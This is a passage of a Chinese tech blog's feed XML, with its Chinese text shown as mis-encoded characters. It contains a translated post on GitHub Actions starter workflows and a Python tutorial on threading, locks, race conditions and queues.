id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/57#issuecomment-468518848"><strong>qiwihui</strong></a> on: <strong>3/1/2019</strong></p></blockquote><p>æ·»åŠ  gooogle analytics</p><ul><li><a href="http://www.milos.curuvija.com/miscellaneous/sphinx/sphinx_google_analytics_integration.html">http://www.milos.curuvija.com/miscellaneous/sphinx/sphinx_google_analytics_integration.html</a></li><li><a href="https://www.ericholscher.com/blog/2009/apr/5/adding-google-analytics-sphinx-docs/">https://www.ericholscher.com/blog/2009/apr/5/adding-google-analytics-sphinx-docs/</a></li></ul>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ Sphinx æ’°å†™æŠ€æœ¯æ–‡æ¡£å¹¶ç”Ÿæˆ PDF æ€»ç»“
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬7å¤©ï¼šå…¥é—¨å·¥ä½œæµç¨‹</title>
    <link href="https://qiwihui.com/qiwihui-blog-90/"/>
    <id>https://qiwihui.com/qiwihui-blog-90/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä½ ä»…åˆ›å»ºäº†ä¸€ä¸ªæˆ–ä¸¤ä¸ªGitHub Actionså·¥ä½œæµï¼Œåˆ™å¯èƒ½å¯¹å¦‚ä½•èµ·æ­¥ä¸å¤ªå…³æ³¨ï¼Œä½†æ˜¯GitHub Actionså›¢é˜Ÿå…³æ³¨å¦‚ä½•èµ·æ­¥ï¼Œä»–ä»¬åŠªåŠ›å·¥ä½œï¼Œä»¥ä½¿ä½ èƒ½å°½å¯èƒ½è½»æ¾åœ°å¼€å§‹ä½¿ç”¨Actionsã€‚</p><p>åœ¨åˆ›å»ºæ–°å·¥ä½œæµç¨‹æ—¶ï¼ŒGitHubé¦–å…ˆè¦è€ƒè™‘çš„æ˜¯å­˜å‚¨åº“ä¸­çš„ä»£ç ç±»å‹ã€‚GitHub Actionsä½¿ç”¨æˆç†Ÿçš„<a href="https://github.com/github/linguist">è¯­è¨€å·¥å…·</a>æ¥äº†è§£ä½ çš„å­˜å‚¨åº“åŒ…å«å“ªç§ä»£ç ã€‚è¿™æ˜¯ä¸ºGitHubè®¸å¤šå…¶ä»–éƒ¨åˆ†æä¾›æ”¯æŒçš„å·¥å…·ï¼Œå…¶ä¸­åŒ…æ‹¬å­˜å‚¨åº“ä¸»é¡µä¸Šçš„è¯­è¨€ç»Ÿè®¡æ ã€‚</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/77240850-d0269280-6c25-11ea-8b6b-759de7111087.png" alt="image"></p><p>å¯¹äºè¿™ä¸ªæ‹¥æœ‰å¤§é‡JavaScriptçš„å­˜å‚¨åº“ï¼ŒGitHub Actionså°†é€‰æ‹©ä¸¤ä¸ªå¯èƒ½çš„å·¥ä½œæµç¨‹â”€â”€è¿è¡Œ <code>npm run build</code> å’Œ <code>npm test</code> çš„Node.js CI/CDå·¥ä½œæµç¨‹ï¼ˆè¿™å¯¹åº”ç”¨ç¨‹åºæœ‰ç”¨ï¼‰ï¼Œä»¥åŠæ‰§è¡Œç›¸åŒæ„å»ºå’Œæµ‹è¯•è¿è¡Œçš„æ‰“åŒ…å·¥ä½œæµç¨‹ï¼Œç„¶åå°†ç¨‹åºåŒ…å‘å¸ƒåˆ°GitHub Packagesä¸­ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77240893-3ad7ce00-6c26-11ea-8335-ce18b0802ca4.png" alt="image"></p><p>GitHub Actionsä¸ä»…å…·æœ‰æ„å»ºå’Œæµ‹è¯•é¡¹ç›®çš„èƒ½åŠ›ï¼Œè¿˜æœ‰å·¥ä½œæµå¯ä»¥å¸®åŠ©ä½ å¼€å§‹å°†åº”ç”¨ç¨‹åºéƒ¨ç½²åˆ°äº‘ä¸­ï¼Œæ— è®ºæ˜¯AWSï¼ŒAzureè¿˜æ˜¯Google Cloudã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77240898-504cf800-6c26-11ea-82b1-20faf590faf6.png" alt="image"></p><p>è€Œä¸”ï¼Œå½“ç„¶ï¼Œå°½ç®¡å’Œè¯­è¨€å­¦å®¶ä¸€æ ·å¥½ï¼Œå®ƒä¹Ÿä¸æ˜¯å®Œç¾çš„ã€‚è®¸å¤šäººåœ¨åŒä¸€å­˜å‚¨åº“ä¸­æ··åˆäº†ä¸åŒçš„é¡¹ç›®ï¼Œå› æ­¤ä½ è¿˜å¯ä»¥æ‰©å±•æ•´ä¸ªå¯åŠ¨ç¨‹åºå·¥ä½œæµåˆ—è¡¨ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77240908-75da0180-6c26-11ea-9612-42b3c634aeb6.png" alt="image"></p><p>å¦‚æœä½ æƒ³å¸®åŠ©æ”¹å–„å…¥é—¨å·¥ä½œæµç¨‹â”€â”€æ— è®ºæ˜¯å¯¹ç°æœ‰å·¥ä½œæµç¨‹è¿›è¡Œæ›´æ”¹ï¼Œè¿˜æ˜¯æ·»åŠ å…¨æ–°çš„è¯­è¨€ï¼Œéƒ½å¯ä»¥åœ¨<a href="https://github.com/actions/starter-workflows">GitHubä¸Š</a>è¿›è¡Œæäº¤ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_7_starter_workflows.html">https://www.edwardthomson.com/blog/github_actions_7_starter_workflows.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬7å¤©ï¼šå…¥é—¨å·¥ä½œæµç¨‹
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>16. å¤šçº¿ç¨‹ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-134/"/>
    <id>https://qiwihui.com/qiwihui-blog-134/</id>
    <published>2022-08-13T01:54:25.300Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†å¦‚ä½•åœ¨Pythonä¸­ä½¿ç”¨ <code>threading</code> æ¨¡å—ã€‚</p><ul><li>å¦‚ä½•åˆ›å»ºå’Œå¯åŠ¨å¤šä¸ªçº¿ç¨‹</li><li>å¦‚ä½•ç­‰å¾…çº¿ç¨‹å®Œæˆ</li><li>å¦‚ä½•åœ¨çº¿ç¨‹ä¹‹é—´å…±äº«æ•°æ®</li><li>å¦‚ä½•ä½¿ç”¨é”ï¼ˆ <code>lock</code> ï¼‰æ¥é˜²æ­¢ç«æ€æƒ…å†µ</li><li>ä»€ä¹ˆæ˜¯å®ˆæŠ¤çº¿ç¨‹</li><li>å¦‚ä½•ä½¿ç”¨ <code>Queue</code> è¿›è¡Œçº¿ç¨‹å®‰å…¨çš„æ•°æ®/ä»»åŠ¡å¤„ç†ã€‚</li></ul><span id="more"></span><h3><span id="chuang-jian-he-yun-xing-xian-cheng">åˆ›å»ºå’Œè¿è¡Œçº¿ç¨‹</span></h3><p>ä½ å¯ä»¥ä½¿ç”¨ <code>threading.Thread()</code> åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚ å®ƒåŒ…å«ä¸¤ä¸ªé‡è¦çš„å‚æ•°ï¼š</p><ul><li><code>target</code>ï¼šçº¿ç¨‹å¯åŠ¨æ—¶è¦è°ƒç”¨çš„è¯¥çº¿ç¨‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼ˆå‡½æ•°ï¼‰</li><li><code>args</code>ï¼šç›®æ ‡å‡½æ•°çš„ï¼ˆå‡½æ•°ï¼‰å‚æ•°ã€‚ è¿™å¿…é¡»æ˜¯ä¸€ä¸ªå…ƒç»„</li></ul><p>ä½¿ç”¨ <code>thread.start()</code> å¯åŠ¨çº¿ç¨‹</p><p>è°ƒç”¨ <code>thread.join()</code> å‘Šè¯‰ç¨‹åºåœ¨ç»§ç»­æ‰§è¡Œå…¶ä½™ä»£ç ä¹‹å‰ï¼Œåº”ç­‰å¾…è¯¥çº¿ç¨‹å®Œæˆã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    threads = []</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºçº¿ç¨‹ï¼Œå¹¶ç»™æ¯ä¸€ä¸ªçº¿ç¨‹åˆ†é…å‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        thread = Thread(target=square_numbers)</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯åŠ¨æ‰€æœ‰çº¿ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="comment"># é˜»å¡ä¸»çº¿ç¨‹ç›´åˆ°æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h3><span id="zai-xian-cheng-zhi-jian-gong-xiang-shu-ju">åœ¨çº¿ç¨‹ä¹‹é—´å…±äº«æ•°æ®</span></h3><p>ç”±äºçº¿ç¨‹ä½äºç›¸åŒçš„å†…å­˜ç©ºé—´ä¸­ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥è®¿é—®ç›¸åŒçš„ï¼ˆå…¬å…±ï¼‰æ•°æ®ã€‚ å› æ­¤ï¼Œä¾‹å¦‚ï¼Œä½ å¯ä»¥ç®€å•åœ°ä½¿ç”¨æ‰€æœ‰çº¿ç¨‹éƒ½å…·æœ‰è¯»å–å’Œå†™å…¥è®¿é—®æƒé™çš„å…¨å±€å˜é‡ã€‚</p><p>ä»»åŠ¡ï¼šåˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹åº”è®¿é—®å½“å‰æ•°æ®åº“å€¼ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»…å°†å…¶å¢åŠ 1ï¼‰ï¼Œç„¶åå°†æ–°å€¼å†™å›åˆ°æ•°æ®åº“å€¼ä¸­ã€‚ æ¯ä¸ªçº¿ç¨‹åº”æ‰§è¡Œ10æ¬¡æ­¤æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰çº¿ç¨‹å¯ä»¥è®¿é—®å…¨å±€å˜é‡</span></span><br><span class="line">database_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>():</span><br><span class="line">    <span class="keyword">global</span> database_value <span class="comment"># éœ€è¦å¯ä»¥ä¿®æ”¹å…¨å±€å˜é‡</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è·å–æœ¬åœ°å‰¯æœ¬ï¼ˆæ¨¡æ‹Ÿæ•°æ®è·å–ï¼‰</span></span><br><span class="line">    local_copy = database_value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¨¡æ‹Ÿä¸€äº›ä¿®æ”¹æ“ä½œ</span></span><br><span class="line">    local_copy += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†è®¡ç®—çš„æ€§è´¨å†™å…¥å…¨å±€å˜é‡</span></span><br><span class="line">    database_value = local_copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start value: &#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    t1 = Thread(target=increase)</span><br><span class="line">    t2 = Thread(target=increase)</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;End value:&#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start value:  <span class="number">0</span></span><br><span class="line">End value: <span class="number">1</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="ru-he-shi-yong-suo">å¦‚ä½•ä½¿ç”¨é”</span></h3><p>è¯·æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ2ä¸ªçº¿ç¨‹å°†å€¼é€’å¢1ï¼Œå› æ­¤å°†æ‰§è¡Œ2ä¸ªé€’å¢æ“ä½œã€‚ä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆæœ€ç»ˆå€¼æ˜¯1è€Œä¸æ˜¯2ï¼Ÿ</p><h3><span id="jing-tai-tiao-jian">ç«æ€æ¡ä»¶</span></h3><p>è¿™é‡Œå‘ç”Ÿäº†ç«æ€æƒ…å†µã€‚å½“ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®å…±äº«æ•°æ®å¹¶ä¸”å®ƒä»¬è¯•å›¾åŒæ—¶æ›´æ”¹å®ƒä»¬æ—¶ï¼Œå°±ä¼šå‘ç”Ÿç«æ€æƒ…å†µã€‚å› ä¸ºçº¿ç¨‹è°ƒåº¦ç®—æ³•å¯ä»¥éšæ—¶åœ¨çº¿ç¨‹ä¹‹é—´äº¤æ¢ï¼Œæ‰€ä»¥ä½ ä¸çŸ¥é“çº¿ç¨‹å°è¯•è®¿é—®å…±äº«æ•°æ®çš„é¡ºåºã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—® <code>database_value</code>ï¼ˆ0ï¼‰å¹¶å°†å…¶å­˜å‚¨åœ¨æœ¬åœ°å‰¯æœ¬ä¸­ã€‚ç„¶åå°†å…¶é€’å¢ï¼ˆ <code>local_copy</code> ç°åœ¨ä¸º1ï¼‰ã€‚åˆ©ç”¨æˆ‘ä»¬çš„ <code>time.sleep()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä»…æ¨¡æ‹Ÿä¸€äº›è€—æ—¶çš„æ“ä½œï¼Œåœ¨æ­¤æœŸé—´ï¼Œç¨‹åºå°†äº¤æ¢åˆ°ç¬¬äºŒä¸ªçº¿ç¨‹ã€‚è¿™è¿˜å°†æ£€ç´¢å½“å‰çš„ <code>database_value</code>ï¼ˆä»ä¸º0ï¼‰ï¼Œå¹¶å°† <code>local_copy</code> é€’å¢ä¸º1ã€‚ç°åœ¨ï¼Œä¸¤ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå€¼ä¸º1çš„æœ¬åœ°å‰¯æœ¬ï¼Œå› æ­¤ä¸¤ä¸ªçº¿ç¨‹éƒ½å°†1å†™å…¥å…¨å±€ <code>database_value</code>ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ€ç»ˆå€¼æ˜¯1è€Œä¸æ˜¯2çš„åŸå› ã€‚</p><h3><span id="shi-yong-suo-bi-mian-jing-tai-tiao-jian">ä½¿ç”¨é”é¿å…ç«æ€æ¡ä»¶</span></h3><p>é”ï¼ˆä¹Ÿç§°ä¸ºäº’æ–¥é”ï¼‰æ˜¯ä¸€ç§åŒæ­¥æœºåˆ¶ï¼Œç”¨äºåœ¨å­˜åœ¨è®¸å¤šæ‰§è¡Œçº¿ç¨‹çš„ç¯å¢ƒä¸­å¼ºåˆ¶é™åˆ¶å¯¹èµ„æºçš„è®¿é—®ã€‚é”å…·æœ‰ä¸¤ç§çŠ¶æ€ï¼š<strong>é”å®š</strong>å’Œ<strong>è§£é”</strong>ã€‚å¦‚æœçŠ¶æ€æ˜¯é”å®šçš„ï¼Œåˆ™åœ¨çŠ¶æ€å†æ¬¡è¢«è§£é”ä¹‹å‰ï¼Œä¸å…è®¸å…¶ä»–å¹¶å‘çº¿ç¨‹è¿›å…¥æ­¤ä»£ç æ®µã€‚</p><p>ä¸¤ä¸ªå‡½æ•°å¾ˆé‡è¦ï¼š</p><ul><li><code>lock.acquire()</code>ï¼šè¿™å°†é”å®šçŠ¶æ€å¹¶é˜»å¡</li><li><code>lock.release()</code>ï¼šè¿™å°†å†æ¬¡è§£é”çŠ¶æ€ã€‚</li></ul><p>é‡è¦æç¤ºï¼šå—è·å¾—åï¼Œä½ åº”å§‹ç»ˆå†æ¬¡é‡Šæ”¾å®ƒï¼</p><p>åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæ£€ç´¢å’Œä¿®æ”¹æ•°æ®åº“å€¼çš„å…³é”®ä»£ç éƒ¨åˆ†ç°å·²é”å®šã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ç¬¬äºŒä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹å…¨å±€æ•°æ®ã€‚æˆ‘ä»¬çš„ä»£ç æ²¡æœ‰å¤ªå¤§å˜åŒ–ã€‚æ‰€æœ‰æ–°æ›´æ”¹éƒ½åœ¨ä¸‹é¢çš„ä»£ç ä¸­è¿›è¡Œäº†æ³¨é‡Šã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import Lock</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">database_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>(<span class="params">lock</span>):</span><br><span class="line">    <span class="keyword">global</span> database_value </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é”å®šçŠ¶æ€</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    </span><br><span class="line">    local_copy = database_value</span><br><span class="line">    local_copy += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    database_value = local_copy</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è§£é”çŠ¶æ€</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºé”</span></span><br><span class="line">    lock = Lock()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start value: &#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†é”ä¼ é€’ç»™ç›®æ ‡å‡½æ•°</span></span><br><span class="line">    t1 = Thread(target=increase, args=(lock,)) <span class="comment"># æ³¨æ„é”åçš„é€—å·ï¼Œå› ä¸ºargså¿…é¡»æ˜¯ä¸€ä¸ªå…ƒç»„</span></span><br><span class="line">    t2 = Thread(target=increase, args=(lock,))</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;End value:&#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start value:  <span class="number">0</span></span><br><span class="line">End value: <span class="number">2</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-suo-zuo-wei-shang-xia-wen-guan-li-qi">ä½¿ç”¨é”ä½œä¸ºä¸Šä¸‹æ–‡ç®¡ç†å™¨</span></h3><p>åœ¨ <code>lock.acquire()</code> ä¹‹åï¼Œä½ åº”è¯¥æ°¸è¿œä¸è¦å¿˜è®°è°ƒç”¨ <code>lock.release()</code> æ¥è§£é”ä»£ç ã€‚ ä½ è¿˜å¯ä»¥å°†é”ç”¨ä½œä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œè¿™å°†å®‰å…¨åœ°é”å®šå’Œè§£é”ä½ çš„ä»£ç ã€‚ å»ºè®®ä»¥è¿™ç§æ–¹å¼ä½¿ç”¨é”ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>(<span class="params">lock</span>):</span><br><span class="line">    <span class="keyword">global</span> database_value </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> lock: </span><br><span class="line">        local_copy = database_value</span><br><span class="line">        local_copy += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        database_value = local_copy</span><br></pre></td></tr></table></figure><h3><span id="zai-python-zhong-shi-yong-dui-lie">åœ¨Pythonä¸­ä½¿ç”¨é˜Ÿåˆ—</span></h3><p>é˜Ÿåˆ—å¯ç”¨äºå¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹ç¯å¢ƒä¸­çš„çº¿ç¨‹å®‰å…¨/è¿›ç¨‹å®‰å…¨çš„æ•°æ®äº¤æ¢å’Œæ•°æ®å¤„ç†ã€‚</p><h3><span id="dui-lie">é˜Ÿåˆ—</span></h3><p>é˜Ÿåˆ—æ˜¯éµå¾ªå…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰åŸç†çš„çº¿æ€§æ•°æ®ç»“æ„ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯æ’é˜Ÿç­‰å€™çš„å®¢æˆ·é˜Ÿåˆ—ï¼Œå…¶ä¸­é¦–å…ˆæœåŠ¡çš„æ˜¯ç¬¬ä¸€ä½çš„å®¢æˆ·ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé˜Ÿåˆ—</span></span><br><span class="line">q = Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å…ƒç´ </span></span><br><span class="line">q.put(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">q.put(<span class="number">2</span>) <span class="comment"># 2 1</span></span><br><span class="line">q.put(<span class="number">3</span>) <span class="comment"># 3 2 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ q çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 1 --&gt; front</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å’Œç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">first = q.get() <span class="comment"># --&gt; 1</span></span><br><span class="line"><span class="built_in">print</span>(first) </span><br><span class="line"></span><br><span class="line"><span class="comment"># q ç°åœ¨çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 --&gt; front</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-duo-xian-cheng-zhong-shi-yong-dui-lie">åœ¨å¤šçº¿ç¨‹ä¸­ä½¿ç”¨é˜Ÿåˆ—</span></h3><p>å¸¦æœ‰é˜Ÿåˆ—çš„æ“ä½œæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚é‡è¦æ–¹æ³•æ˜¯ï¼š</p><ul><li><code>q.get()</code>ï¼šåˆ é™¤å¹¶è¿”å›ç¬¬ä¸€é¡¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šé˜»å¡ï¼Œç›´åˆ°è¯¥é¡¹å¯ç”¨ä¸ºæ­¢ã€‚</li><li><code>q.put(item)</code>ï¼šå°†å…ƒç´ æ”¾åœ¨é˜Ÿåˆ—çš„æœ«å°¾ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰ç©ºé—²æ’æ§½å¯ç”¨ä¸ºæ­¢ã€‚</li><li><code>q.task_done()</code>ï¼šæŒ‡ç¤ºå…ˆå‰å…¥é˜Ÿçš„ä»»åŠ¡å·²å®Œæˆã€‚å¯¹äºæ¯ä¸ª <code>get()</code>ï¼Œåœ¨å®Œæˆæ­¤é¡¹ä»»åŠ¡åï¼Œéƒ½åº”è°ƒç”¨æ­¤å‡½æ•°ã€‚</li><li><code>q.join()</code>ï¼šé˜»å¡ç›´åˆ°é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰é¡¹ç›®éƒ½å·²è·å–å¹¶å¤„ç†ï¼ˆå·²ä¸ºæ¯ä¸ªé¡¹ç›®è°ƒç”¨ <code>task_done()</code>ï¼‰ã€‚</li><li><code>q.empty()</code>ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›Trueã€‚</li></ul><p>ä»¥ä¸‹ç¤ºä¾‹ä½¿ç”¨é˜Ÿåˆ—æ¥äº¤æ¢0è‡³19ä¹‹é—´çš„æ•°å­—ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½è°ƒç”¨workeræ–¹æ³•ã€‚åœ¨æ— é™å¾ªç¯å†…ï¼Œçº¿ç¨‹ç­‰å¾…ç›´åˆ°ç”±äºé˜»å¡ <code>q.get()</code> è°ƒç”¨è€Œä½¿é¡¹å¯ç”¨ä¸ºæ­¢ã€‚é¡¹å¯ç”¨æ—¶ï¼Œå°†å¯¹å…¶è¿›è¡Œå¤„ç†ï¼ˆå³ï¼Œä»…åœ¨æ­¤å¤„æ‰“å°ï¼‰ï¼Œç„¶å <code>q.task_done()</code> å‘ŠçŸ¥é˜Ÿåˆ—å¤„ç†å·²å®Œæˆã€‚åœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œåˆ›å»º10ä¸ª<strong>å®ˆæŠ¤</strong>çº¿ç¨‹ã€‚è¿™æ„å‘³ç€å®ƒä»¬åœ¨ä¸»çº¿ç¨‹æ­»äº¡æ—¶è‡ªåŠ¨æ­»äº¡ï¼Œå› æ­¤ä¸å†è°ƒç”¨workeræ–¹æ³•å’Œæ— é™å¾ªç¯ã€‚ç„¶åï¼Œé˜Ÿåˆ—ä¸­å¡«å……äº†é¡¹ï¼Œå¹¶ä¸”workeræ–¹æ³•å¯ä»¥ç»§ç»­ä½¿ç”¨å¯ç”¨é¡¹ã€‚æœ€åï¼Œéœ€è¦ <code>q.join()</code> æ¥é˜»å¡ä¸»çº¿ç¨‹ï¼Œç›´åˆ°è·å¾—å¹¶å¤„ç†æ‰€æœ‰é¡¹ä¸ºæ­¢ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock, current_thread</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">q, lock</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        value = q.get()  <span class="comment"># é˜»å¡çŸ¥é“æœ‰å¯ç”¨é¡¹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># åšä¸€äº›å¤„ç†...</span></span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨é”é˜»æ­¢å…¶ä»–æ‰“å°</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;in <span class="subst">&#123;current_thread().name&#125;</span> got <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯¹å¼ˆæ¯ä¸€ä¸ª get()ï¼Œéšåå¯¹ task_done() 